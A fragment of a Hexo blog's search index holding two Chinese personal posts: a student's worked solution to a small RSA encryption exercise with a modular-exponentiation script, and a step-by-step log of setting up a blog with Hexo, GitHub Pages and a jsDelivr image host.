        <content type="html"><![CDATA[<h1 id="痛苦的密码学"><a href="#痛苦的密码学" class="headerlink" title="痛苦的密码学"></a>痛苦的密码学</h1><p>师弟和我都上云云老师的这门密码学，今天发来一个题，问我怎么做（我明天下午就要考密码学了）</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704221200467.png" alt="image-20240704221200467"></p><p>恰好23级的师妹Rsa学的比较多，我就开始问师妹，因为我算的也是错的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/1720102391237.png" alt="1720102391237"></p><p>正好简单记录一下，就当复习考试，这题很蠢的是，我和师弟都算的是解密的答案51，但是题目要求我们算加密的密文是多少。。</p><p>么就要算e了，还得学一下Markdown怎么写公式。</p><p>复习了半小时欧几里得求乘法逆元，终于算出来了e是43</p><p>然后要求2^43模77的结果，好好好，再复习一遍高次幂的求法，模幂算法，我和师妹研究半天，都是算错的，最后我让kimi给我生成了个脚本，看脚本看懂了…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def mod_pow(base, exponent, modulus):</span><br><span class="line">    result = 1</span><br><span class="line">    base = base % modulus</span><br><span class="line">    while exponent &gt; 0:</span><br><span class="line">        if exponent % 2 == 1:  # 如果指数是奇数</span><br><span class="line">            result = (result * base) % modulus</span><br><span class="line">        print(exponent)</span><br><span class="line">        exponent = exponent &gt;&gt; 1  # 指数除以2，相当于右移一位</span><br><span class="line">        base = (base * base) % modulus</span><br><span class="line">        print(f&quot;result:&#123;result&#125; \n base:&#123;base&#125; \n exponent:&#123;exponent&#125; \n ==================&quot;)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">#101011</span><br><span class="line"></span><br><span class="line"># 计算2的43次方模77</span><br><span class="line">result = mod_pow(2, 43, 77)</span><br><span class="line">print(f&quot;2的43次方模77的结果是: &#123;result&#125;&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建记录</title>
      <link href="/2024/07/04/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/04/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建记录"><a href="#博客搭建记录" class="headerlink" title="博客搭建记录"></a>博客搭建记录</h1><p><a href="https://blog.xsmzzz756.top/">我的博客</a></p><p>突然心血来潮，想搭建起自己的博客，把平时的Markdown笔记存下来，CSDN属实是不想再用了，文章违规、也不太方便写、平时要用还要登录，但是本地的MD笔记经常清除本地图片或者找不到放哪了，所以感觉还是非常有必要搭建博客来记录自己的学习情况</p><h2 id="方案选择"><a href="#方案选择" class="headerlink" title="方案选择"></a>方案选择</h2><p><a href="https://pdpeng.github.io/2022/01/19/setup-personal-blog/">快速搭建个人博客 —— 保姆级教程 | 攻城狮杰森</a>  </p><p>查资料后了解到两种主流方案：</p><p>1、Hexo + github pages</p><blockquote><p><strong>Hexo</strong> 是一个快速、简单且功能强大的博客框架。你用<strong>Markdown</strong>（或其他标记语言）写帖子，Hexo 会在几秒钟内生成带有漂亮主题的<strong>静态文件</strong></p><p><strong>GitHub Pages</strong>是一种由<strong>GitHub</strong>中的仓库&#x2F;项目直接创建的网页。管理简单，在本地编辑仓库中的内容，上传到GitHub上，GitHub Pages就能快速完成更新，重点是<strong>不花钱，不花钱，不花钱</strong></p></blockquote><p>2、Wordpress</p><blockquote><p>不多说</p></blockquote><p>最后选择了Hexo+github pages</p><p>主要是我不太想管理网站，而且我更喜欢Hexo的主题风格，也没有多余的服务器了属实是，一台作vpn，一台作蜜罐，国内服务器真心感觉备案很烦</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境准备：nodejs + npm + github账号 + vscode + git + 一个良好的网络（我不开加速器访问不上github）</span><br></pre></td></tr></table></figure><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>Hexo常用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- hexo init         # Initializes a website</span><br><span class="line">- hexo new          # Creates a new article</span><br><span class="line">- hexo generate     # Generates static files</span><br><span class="line">- hexo publish      # Publishes a draft</span><br><span class="line">- hexo server       # Starts a local server</span><br><span class="line">- hexo stop         # stop a local server(Ctrl-C)</span><br><span class="line">- hexo deploy       # Deploys your website</span><br><span class="line">- hexo clean        # Cleans the cache file (db.json) and generated files (public)</span><br></pre></td></tr></table></figure><p>Hexo 基础结构</p><blockquote><p>public 最终所见网页的所有内容<br>node_modules 插件以及hexo所需node.js模块<br>_config.yml 站点配置文件，设定一些公开信息等<br>package.json 应用程序信息，配置hexo运行所需js包<br>scaffolds 模板文件夹，新建文章，会默认包含对应模板内容<br>themes 存放主题文件，hexo根据主题生成静态网页（速度贼快）<br>source 用于存放用户资源（除 posts 文件夹，其余命名方式为 “ + 文件名”的文件被忽略）</p></blockquote><p>首先找一个地方来放我们的博客项目</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704214653601.png" alt="image-20240704214653601"></p><p>然后在对应目录下执行下面的命令，就会出现上图部分基础文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><h3 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h3><p><a href="https://hexo.io/themes/">hexo官方主题库</a></p><p>开始找了一些比较中意的主题，但是down下来后，发现自己不太配置的明白，所以就直接用了这个Butterfly，算比较常见和成熟吧。</p><p><a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly安装配置教程</a></p><p>具体配置参考上面这个链接就行，目前我的只完成了一部分，后续还要再研究下</p><h3 id="github的配置"><a href="#github的配置" class="headerlink" title="github的配置"></a>github的配置</h3><p>创建一个仓库，名字为用户名.github.io，最好创建完以后，在仓库中新建一个index.html文件，然后访问看看</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215505464.png" alt="image-20240704215505464"></p><p>Pages下可以详细的配置，这里记住自己的分支，我的是main</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215553046.png" alt="image-20240704215553046"></p><p>在个人账号设置里，获取一下token，第一次创建才会显示，所以要记住</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215839756.png" alt="image-20240704215839756"></p><p>修改hexo项目根目录下的_config.yml</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215943368.png" alt="image-20240704215943368"></p><p>还有一个git的ssh，如果部署项目到github上的时候报错了，可能是这个没有配置，具体步骤忘了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704215804469.png" alt="image-20240704215804469"></p><h3 id="图床配置"><a href="#图床配置" class="headerlink" title="图床配置"></a>图床配置</h3><p>Github + PicGo + jsdelivr的cdn</p><p>复制仓库中的一个图片链接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220324055.png" alt="image-20240704220324055"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220518717.png" alt="image-20240704220518717"></p><p>jsDelivr会自动转链接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220552399.png" alt="image-20240704220552399"></p><p>token填开始在github个人账号配置的token</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220405370.png" alt="image-20240704220405370"></p><h3 id="Typora配置"><a href="#Typora配置" class="headerlink" title="Typora配置"></a>Typora配置</h3><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704220755930.png" alt="image-20240704220755930"></p><h3 id="写文"><a href="#写文" class="headerlink" title="写文"></a>写文</h3><p>写文在source&#x2F;_posts&#x2F;下写就行了，Typora或者直接VScode写都行</p><p>最后把今天两篇文章一起上传了，网络不通我就上传不成功…</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240704222030272.png" alt="image-20240704222030272"></p><h3 id="自定义域名（2024-7-14补充）"><a href="#自定义域名（2024-7-14补充）" class="headerlink" title="自定义域名（2024.7.14补充）"></a>自定义域名（2024.7.14补充）</h3><p>在github仓库设置中找到Pages，将域名填入下面的Custom domain</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714204529276.png" alt="image-20240714204529276"></p><p>在自己域名的托管网站添加CNAME记录，指向原域名bthcls756.github.io</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240714204606438.png" alt="image-20240714204606438"></p><h3 id="网站验证"><a href="#网站验证" class="headerlink" title="网站验证"></a>网站验证</h3><p>支持<a href="https://search.google.com/">谷歌</a>、<a href="https://ziyuan.baidu.com/">百度</a>收录网站</p><h4 id="谷歌"><a href="#谷歌" class="headerlink" title="谷歌"></a>谷歌</h4><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715161922815.png" alt="image-20240715161922815"></p><p>请求编入索引，谷歌会调用爬虫爬取网站网页</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240721231338448.png" alt="image-20240721231338448"></p><h4 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h4><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715161858119.png" alt="image-20240715161858119"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240715161813333.png" alt="image-20240715161813333"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
